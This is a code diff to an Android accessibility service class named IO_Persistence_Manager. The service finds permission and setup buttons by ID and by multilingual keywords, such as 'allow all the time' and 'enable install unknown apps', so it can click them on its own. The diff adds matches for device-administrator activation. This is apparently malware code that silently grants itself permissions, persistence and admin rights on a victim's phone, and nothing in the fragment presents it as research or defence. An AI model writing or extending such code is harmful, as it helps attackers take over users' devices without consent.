@@ -1594,6 +1594,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 lowerId.contains("permission_allow_button") ||
                 lowerId.contains("permission_allow_always_button") ||
                 lowerId.contains("permission_allow_one_time_button") ||
+                lowerId.contains("action_button") ||
+                lowerId.contains("admin_add") ||
                 lowerId.endsWith("btnguideaction") ||
                 lowerId.endsWith("btncheckupdate") ||
                 lowerId.contains("btncheckforupdate") ||
@@ -1631,7 +1633,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String[] keywords = {
                 "while using the app", "only this time", "allow all the time",
                 "allow", "allow all", "grant", "permitir", "permitir siempre",
-                "aceptar", "autoriser", "oui", "turn on", "enable", "activate", "yes", "ok",
+                "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
+                "activate this device admin", "activate this device administrator", "yes", "ok",
                 "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
                 "enable protection", "enable notification access", "enable file storage access",
                 "enable install unknown apps", "enable system protection", "proceed", "continue"
